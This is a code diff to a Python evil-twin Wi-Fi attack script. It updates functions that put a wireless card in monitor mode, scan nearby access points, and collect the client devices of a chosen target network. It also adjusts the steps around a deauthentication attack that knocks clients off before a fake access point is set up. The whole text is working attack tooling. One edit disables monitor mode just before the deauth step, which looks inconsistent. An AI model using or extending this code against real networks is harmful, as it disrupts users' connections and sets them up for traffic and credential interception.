@@ -16,25 +16,32 @@ def bash(cmd):
 
 
 def enable_monitor_mode(interface):
-    bash(f"ifconfig {interface} down")
+    bash(f"ip link set {interface} down")
+    time.sleep(1)
+    # use iw to set interface to monitor mode
     bash(f"iw {interface} set monitor none")
-    bash(f"ifconfig {interface} up")
+    bash(f"ip link set {interface} up")
+    time.sleep(1)
 
 
 def disable_monitor_mode(interface):
-    bash(f"ifconfig {interface} down")
-    bash(f"iw {interface} mode managed")
-    bash(f"ifconfig {interface} up")
+    bash(f"ip link set {interface} down")
+    time.sleep(1)
+    # use iw to set interface to managed mode
+    bash(f"iw {interface} set type managed")
+    bash(f"ip link set {interface} up")
+    time.sleep(1)
 
 
 def change_channel(interface):
     global done_scanning
     ch = 1
     while True and not done_scanning:
-        bash(f"iw {interface} channel {ch}")
-        # switch channel from 1 to 14 each 0.5s
+        # change channel
+        bash(f"iw {interface} set channel {ch}")
+        # switch channel from 1 to 14 each 1s
         ch = ch % 14 + 1
-        time.sleep(0.5)
+        time.sleep(1)
 
 
 def callback_ap(pkt):
@@ -42,9 +49,10 @@ def callback_ap(pkt):
     if pkt.haslayer(Dot11Beacon):
         bssid = pkt[Dot11].addr2
         ssid = pkt[Dot11Elt].info.decode()
+        signal_strength = pkt.dBm_AntSignal
         if bssid not in [ap[0] for ap in ap_list]:
             ap_list.append((bssid, ssid))
-            print(f"\t[+] Found new access point: {bssid} {ssid}")
+            print(f"\t[+] Found new access point: {bssid} {ssid}\tSignal strength: {signal_strength}")
 
 
 def callback_client(pkt):
@@ -56,6 +64,11 @@ def callback_client(pkt):
                 if pkt.type in [1, 2]:  # the type I'm looking for
                     if pkt.addr2 not in clients and pkt.addr2 != '':
                         clients.append(pkt.addr2)
+
+    if (pkt.addr2 == ap_to_attack[0] or pkt.addr3 == ap_to_attack[0]) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
+        if pkt.addr1 not in clients and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
+            clients.append(pkt.addr1)
+            print(f"\t[+] Found new client: {pkt.addr1}")
 
 
 def killall():
@@ -79,7 +92,6 @@ class EvilTwin:
     def scan_for_aps(self):
         #  scan for nearby access points for 60 seconds
         channel_changer = Thread(target=change_channel, args=(self.interface,))
-        channel_changer.daemon = True
         channel_changer.start()
         sniff(prn=callback_ap, iface=self.interface, timeout=20)
         global done_scanning
@@ -170,11 +182,10 @@ class EvilTwin:
         #  enable monitor mode
         print("[*] Enabling monitor mode")
         enable_monitor_mode(self.interface)
-
+        time.sleep(1)
         #  scan for nearby access points
         print("[*] Scanning for nearby access points")
         self.scan_for_aps()
-        ap_list.append(("00:00:00:00:00:00", "test"))
         print(f"[*] Found {len(ap_list)} access points")
 
         #  prompt user for access point to attack
@@ -209,6 +220,8 @@ class EvilTwin:
 
         # deauth for 10 seconds
         print("[*] Starting deauth attack for 10 seconds")
+        disable_monitor_mode(self.interface)
+        time.sleep(1)
         self.de_auth_client(10)
 
         #  set up access point for client to connect to
@@ -251,5 +264,4 @@ def main():
 
 if __name__ == "__main__":
     killall()
-    time.sleep(2)
     main()
